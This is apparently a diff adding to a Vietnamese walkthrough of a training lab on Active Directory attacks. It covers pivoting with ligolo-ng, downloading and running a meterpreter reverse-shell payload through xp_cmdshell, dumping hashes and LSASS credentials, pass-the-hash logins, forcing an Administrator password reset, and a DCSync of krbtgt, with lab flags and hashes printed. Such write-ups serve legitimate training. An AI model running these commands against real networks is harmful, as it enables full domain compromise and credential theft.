@@ -2703,7 +2703,7 @@ RDP to MS01
 proxychains xfreerdp3 /v:172.16.7.50 /d:INLANEFREIGHT.LOCAL /u:AB920 /p:weasal /drive:linux,/home/kali/Desktop/learning/AD_enum_attack/share 
 ```
 
-Sau đó chúng ta nên chạy SharpHound.exe cho các bước quan trọng sau này.
+==Sau đó chúng ta nên chạy SharpHound.exe cho các bước quan trọng sau này.
 
 + 1  Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
 
@@ -2832,6 +2832,10 @@ proxychains impacket-mssqlclient netdb@172.16.7.60
 
 Sau đó chúng ta thử thực thi vài câu lệnh
 
+```sql
+EXEC xp_cmdshell "whoami /priv"
+```
+
 ![](images/49.png)
 
 Ở đây chúng ta thấy có quyền mạo danh tài khoản khác, như vậy khả năng cao đang có một tài khoản có `Session` ở  máy chủ này (SQL01, bạn có thể check bằng `hostname`). Chúng ta sẽ truy vấn nó trong BloodHound
@@ -2842,38 +2846,275 @@ Không ngoài dự đoán khi ở đây chúng ta có thể mạo danh mssqlsvc@
 
 Để làm được điều này, ta cần một revershell, tốt nhất là cho `msfconsole` hoặc một `potato attack`.
 
+Tới đây có lẽ set up ligolo-ng là tốt nhất cho pivot thay vì phải thủ công trong msfconsole
+
+Tại máy kali, sau khi đã tải về bộ ligolo-ng
+
+Tạo interface mới cho ligolo
+
+```zsh
+sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up
+```
+
+Khởi động lắng nghe trên port 443 (né firewall)
+
+```zsh
+sudo ./proxy -selfcert -laddr 0.0.0.0:443
+```
+
+Tiếp đó tải `agent` sang máy linux ban đầu
+
+```zsh
+sudo ./agent -connect 10.10.14.81:443 -ignore-cert
+```
+
+Sau khi xác nhận established, chúng ta thiết lập route cho dải mạng nội bộ trên máy kali:
+
+```zsh
+sudo ip route add 172.16.7.0/24 dev ligolo
+```
+
+Tiếp theo vào session của ligolo-ng chọn session mà ta đã thiết lập trước đó rồi chạy start.
+
+![](images/51.png)
+
+Sau đó chúng ta sẽ forward port từ linux về kali.
+
+```zsh
+listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp # for transfering file
+
+listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 # Main pipe to connect back
+```
+
+Kiểm tra lại để xác nhận mọi thứ hoạt động tốt:
+
+![](images/52.png)
+
+Ta sẽ kết nối trực tiếp vào mssql của SQL01 mà không cần proxychains:
+
+```zsh
+impacket-mssqlclient netdb@172.16.7.60
+```
+
+![](images/53.png)
+
 + 1  Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
 
-+10 Streak pts
+Bây giờ ta sẽ chuyển agent.exe sang SQL01 nhờ vào 172.16.7.240:8080 -port-forward--> our kali machine (port 80)
 
- Submit
+```zsh
+EXEC xp_cmdshell "curl -o C:\Users\Public\Downloads\agent.exe http://172.16.7.240:8080/agent.exe"
+```
+
+![](images/54.png)
+
+Thật sự ở bước này rất khó khăn khi mà đường truyền qua VPN không ổn định, tôi đã đổi VPN liên tục từ US sang EU và ngược lại... Tôi khuyên bạn nên chạy msfconsole trên máy linux, hoặc không nếu muốn thành thạo ligolo-ng, bạn nên kiên nhẫn :v
+
+Tiếp theo chạy agen.exe để kiểm tra:
+
+```zsh
+EXEC xp_cmdshell "C:\Users\Public\Downloads\agent.exe -connect 172.16.7.240:443 -ignore-cert"
+```
+
+![](images/55.png)
+
+Đơn thuần chỉ là bước thử nghiệm, giờ chúng ta tập chung vào lấy revshell!
+
+Chúng ta sẽ thêm một listener nữa cho cổng 3333 và lắng nghe 3333 trên msfconsole.
+
+```zsh
+listener_add --addr 0.0.0.0:3333 --to 127.0.0.1:3333 --tcp
+```
+
+Cấu hình msf
+```zsh
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 -f exe -o backup.exe LPORT=3333
+```
+
+```zsh
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 3333
+run
+```
+
+Tải lên và chạy payload
+
+```zsh
+EXEC xp_cmdshell "curl -o C:\Users\Public\Downloads\backup.exe http://172.16.7.240:8080/backup.exe"
+
+EXEC xp_cmdshell "C:\Users\Public\Downloads\backup.exe"
+```
+
+![](images/56.png)
+
+Yeah, mọi thứ rất suôn sẻ, điều tuyệt vời hơn nữa là chúng ta có toàn quyền đối với SQL01
+
+```zsh
+meterpreter > getsystem 
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > getsystem 
+meterpreter > cat C:/Users/Administrator/Desktop/flag.txt
+s3imp3rs0nate_cl@ssic
+```
+
+
+```zsh
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+```
+
+Đơn giản sau khi có hash của local admin, ta chỉ cần disable restrict admin để rdp nếu bạn thích
+
+```cmd
+C:\Windows\system32>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+The operation completed successfully.
+```
+
+Thoải mái winRM vào SQL01 bằng hash của Administator local
+
+```zsh
+evil-winrm -i 172.16.7.60 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+```
+
+Nhưng thứ chúng ta cần hơn đó là hash của mssqlsvc. Đã có quyền system, chúng ta sẽ load module kiwi để dump cả lsass
+
+```zsh
+load kiwi
+creds_all
+```
+
+```zsh
+Username  Domain         NTLM                              SHA1                                      DPAPI
+--------  ------         ----                              ----                                      -----
+SQL01$    INLANEFREIGHT  c8e7a82aa14be4ed0d8187a460d72b37  41e40ba7a6eaa4c0720194e44cfae46ce7b06fa9
+SQL01$    INLANEFREIGHT  6991907663e3f68922d24ac9a573e2c3  33058b24d5882f1dd18ce81988aa64226e2879b5
+mssqlsvc  INLANEFREIGHT  8c9555327d95f815987c0d81238c7660  0a8d7e8141b816c8b20b4762da5b4ee7038b515c  a1568414db09f65c238b7557bc3ceeb8
+```
+
+Tôi thử bẻ khóa nó với rockyou nhưng không thành công...
 
 + 1  Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
 
-+10 Streak pts
+Hãy nhìn lại phần trước, truy vấn bloodhound cho ta thấy `mssqlsvc` là local admin trên MS01
 
- Submit
+![](images/57.png)
 
- Hint
+Đơn giản là rdp mssqlsvc qua MS01 và lấy flag.
+
+Restrict Mode
+```zsh
+crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
+```
+
+Rdp
+
+```zsh
+xfreerdp3 /v:172.16.7.50 /d:INLANEFREIGHT.LOCAL /u:mssqlsvc /pth:8c9555327d95f815987c0d81238c7660 /drive:linux,/home/kali/Desktop/learning/AD_enum_attack/share
+```
+
+![](images/58.png)
+
+```powershell
+PS C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
+exc3ss1ve_adm1n_r1ights!
+```
 
 + 1  Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
 
-+10 Streak pts
+Tôi đã thử dump hash, extract ticket nhưng không tìm thấy gì hữu ích.
 
- Submit
+![](images/60.png)
 
- Hint
+Từ phần gợi ý, chúng ta có lẽ nên chạy Inveigh để tìm kiếm cơ hội
 
+![](images/59.png)
+
+Có hai hashes của CT059 và AB920 (pwned) bị bắt lại
+
+![](images/61.png)
 + 1  Crack this user's password hash and submit the cleartext password as your answer.
 
-+10 Streak pts
+```NTLM
+CT059::INLANEFREIGHT:E7759F423C85C195:F8570ED6AED47850A67DDF237DEEB8ED:01010000000000009D9B60CF2AE1DB012711485D035639170000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008009D9B60CF2AE1DB01060004000200000008003000300000000000000000000000002000007B8F58C3139D63CEA5FCB665CA3325769204522AD1FCD8A35ECAFEAC66483DAC0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
+```
 
- Submit
+Dễ dàng có được mật khẩu
+
+![](images/63.png)
 
 + 1  Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
 
-+10 Streak pts
+Người dùng CT059 này có quyền `GenericAll` đối với cả quản trị viên miền, điều này là vector chiếm toàn bộ miền.
 
- Submit
+![](images/62.png)
+
+Chúng ta sẽ dùng ForceChangePassword để thay đổi mật khẩu của Administrator, sau đó với toàn quyền trên domain, việc có NT hash của KRBTGT là việc quá đơn giản.
+
+==ForceChangePassword
+
+Tạo cred cho người dùng có quyền thay đổi password
+
+```powershell
+$CT059Password = ConvertTo-SecureString 'charlie1' -AsPlainText -Force
+
+$CT059Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $CT059Password)
+```
+
+Tạo mật khẩu mới
+
+```powershell
+$AdminPassword = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+```
+
+Thay đổi mật khẩu
+
+```powershell
+Import-Module .\PowerView.ps1
+
+Set-DomainUserPassword -Identity Administrator -AccountPassword $AdminPassword -Credential $CT059Cred -Verbose
+```
+
+![](images/64.png)
+
+Get DC01 shell
+
+```zsh
+evil-winrm -i 172.16.7.3 -u Administrator -p 'Welcome1!'
+```
+
+Confirm and get flag
+
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+inlanefreight\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/flag.txt
+acLs_f0r_th3_w1n!
+```
 
 + 1  Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.
+
+Đơn giản chúng ta sẽ tiến hành `dcsync` và lấy hash của KRBTGT
+
+```zsh
+impacket-secretsdump -just-dc-user INLANEFREIGHT/krbtgt INLANEFREIGHT/Administrator:'Welcome1!'@172.16.7.3
+```
+
+```zsh
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91
+krbtgt:aes128-cts-hmac-sha1-96:e1fe1e9e782036060fb7cbac23c87f9d
+krbtgt:des-cbc-md5:e0a7fbc176c28a37
+[*] Cleaning up... 
+```
